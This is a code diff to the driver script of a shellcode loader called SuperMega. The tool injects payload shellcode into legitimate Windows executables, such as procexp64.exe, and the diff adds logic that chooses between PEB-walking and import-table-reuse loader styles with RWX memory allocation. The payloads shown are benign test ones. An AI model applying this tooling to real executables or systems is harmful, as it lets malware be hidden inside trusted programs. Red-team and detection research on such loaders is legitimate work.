@@ -2,7 +2,9 @@ import shutil
 from enum import Enum
 from helper import *
 import argparse
+from typing import Dict
 
+from model import *
 from config import config
 from pehelper import *
 from phases.ctoasm import *
@@ -26,10 +28,20 @@ class CopyStyle(Enum):
 class DataRefStyle(Enum):
     APPEND = 1
 
+#class InjectStyle(Enum):
+    
+class SourceStyle(Enum):
+    peb_walk = 1
+    iat_reuse = 2
+
+
 
 options_default = {
     "payload": "shellcodes/calc64.bin",
     "verify": False,
+
+    # Temp
+    "source_style": SourceStyle.peb_walk,
 
     # configuration
     "alloc_style": AllocStyle.RWX,
@@ -61,14 +73,15 @@ options_default = {
 }
 
 
-# VERIFY
+# VERIFY: STD
 # This will verify if our loader works
-# - Use it on a "target" machine
 # - payload shellcode will create a file c:\temp\a
-# - set: verify=True
-options_verify = {
+options_verify_std = {
     "payload": "shellcodes/createfile.bin",
     "verify": True,
+
+    # Temp
+    "source_style": SourceStyle.peb_walk,
 
     # configuration
     "alloc_style": AllocStyle.RWX,
@@ -77,25 +90,64 @@ options_verify = {
     "dataref_style": DataRefStyle.APPEND,
 
     # testing
-    "try_start_loader_shellcode": False,  # without payload (Debugging)
-    "try_start_final_shellcode": False,   # with payload (should work)
-    "try_start_final_infected_exe": False, # with payload (should work)
+    "try_start_loader_shellcode": False,
+    "try_start_final_shellcode": False,
+    "try_start_final_infected_exe": False,
 
     # injecting into exe
     "inject_exe": True,
     "inject_mode": "1,1",
-    #"inject_exe_in": "exes/procexp64.exe",
-    "inject_exe_in": "exes/iattest-full.exe",
-    #"inject_exe_out": "out/procexp64-a.exe",
-    "inject_exe_out": "out/iatttest-full-a.exe",
+    "inject_exe_in": "exes/procexp64.exe",
+    "inject_exe_out": "out/procexp64-a.exe",
 
     # For debugging: Can disable some steps
     "generate_asm_from_c": True,        # phase 2
     "generate_shc_from_asm": True,      # phase 3
     
     # cleanup
-    "cleanup_files_on_start": False,
-    "cleanup_files_on_exit": False, # all is just in out/
+    "cleanup_files_on_start": True,
+    "cleanup_files_on_exit": True, # all is just in out/
+
+    # doesnt work
+    "obfuscate_shc_loader": False,
+    "test_obfuscated_shc": False,
+}
+
+
+# VERIFY: IAT
+# This will verify if our loader works
+# - payload shellcode will create a file c:\temp\a
+options_verify_iat = {
+    "payload": "shellcodes/createfile.bin",
+    "verify": True,
+
+    # Temp
+    "source_style": SourceStyle.peb_walk,
+    
+    # configuration
+    "alloc_style": AllocStyle.RWX,
+    "exec_style": ExecStyle.CALL,
+    "copy_style": CopyStyle.SIMPLE,
+    "dataref_style": DataRefStyle.APPEND,
+
+    # testing
+    "try_start_loader_shellcode": False,
+    "try_start_final_shellcode": False,
+    "try_start_final_infected_exe": False,
+
+    # injecting into exe
+    "inject_exe": True,
+    "inject_mode": "1,1",
+    "inject_exe_in": "exes/iattest-full.exe",  # important
+    "inject_exe_out": "out/iatttest-full-a.exe",
+
+    # For debugging: Can disable some steps
+    "generate_asm_from_c": True,
+    "generate_shc_from_asm": True,
+    
+    # cleanup
+    "cleanup_files_on_start": True,
+    "cleanup_files_on_exit": True, # all is just in out/
 
     # doesnt work
     "obfuscate_shc_loader": False,
@@ -130,11 +182,16 @@ def main():
     parser = argparse.ArgumentParser(description='SuperMega shellcode loader')
     parser.add_argument('--shellcode', type=str, help='The path to the file of your payload shellcode')
     parser.add_argument('--inject', type=str, help='The path to the file where we will inject ourselves in')
-    parser.add_argument('--verify', action='store_true', help='Debug: Perform verification')
+    parser.add_argument('--verify', type=str, help='Debug: Perform verification: std/iat')
     args = parser.parse_args()
 
     if args.verify:
-        options = options_verify
+        if args.verify == "std":
+            options = options_verify_std
+        elif args.verify == "iat":
+            options = options_verify_iat
+        else:
+            print("Unknown verify option {}, use std/iat".format(args.verify))
     else:
         options = options_default
         if args.shellcode:
@@ -157,17 +214,27 @@ def start(options):
     if options["cleanup_files_on_start"]:
         clean_files()
 
-    # Copy: loader C files into working directory: build/
-    shutil.copy("source/main.c", "build/main.c")
-    shutil.copy("source/peb_lookup.h", "build/peb_lookup.h")
-
     # Check: Destination EXE capabilities
-    exe_capabilities = {
-        #"MessageBoxW": None,
-        "GetEnvironmentVariableW": None,
-        "VirtualAlloc": None,
-    }
-    resolve_iat_capabilities(exe_capabilities, options["inject_exe_in"])
+    capabilities = ExeCapabilities([
+        "GetEnvironmentVariableW",
+        "VirtualAlloc"
+    ])
+    capabilities.parse_from_exe(options["inject_exe_in"])
+    capabilities.print()
+
+    if capabilities.has_all():
+        options["source_style"] = SourceStyle.iat_reuse
+    else:
+        options["source_style"] = SourceStyle.peb_walk
+
+    print("--[ SourceStyle: {}".format(options["source_style"].name))
+
+    # Copy: loader C files into working directory: build/
+    if options["source_style"] == SourceStyle.peb_walk:
+        shutil.copy("source/peb_walk/main.c", "build/main.c")
+        shutil.copy("source/peb_walk/peb_lookup.h", "build/peb_lookup.h")
+    elif options["source_style"] == SourceStyle.iat_reuse:
+        shutil.copy("source/iat_reuse/main.c", "build/main.c")
 
     # Convert: C -> ASM
     if options["generate_asm_from_c"]:
@@ -176,7 +243,7 @@ def start(options):
             data_payload = input2.read()
             payload_length = len(data_payload)
             debug_data["payload_shellcode"] = data_payload
-        asm = make_c_to_asm(main_c_file, main_asm_file, payload_length, exe_capabilities)
+        asm = make_c_to_asm(main_c_file, main_asm_file, payload_length, capabilities)
         debug_data["asm_initial"] = asm["initial"]
         debug_data["asm_cleanup"] = asm["cleanup"]
         debug_data["asm_fixup"] = asm["fixup"]
@@ -235,7 +302,7 @@ def start(options):
             options["inject_exe_in"], 
             options["inject_exe_out"], 
             options["inject_mode"],
-            exe_capabilities)
+            capabilities)
         if options["verify"]:
             print("--[ Verify final exe ]")
             if verify_injected_exe(options["inject_exe_out"]):
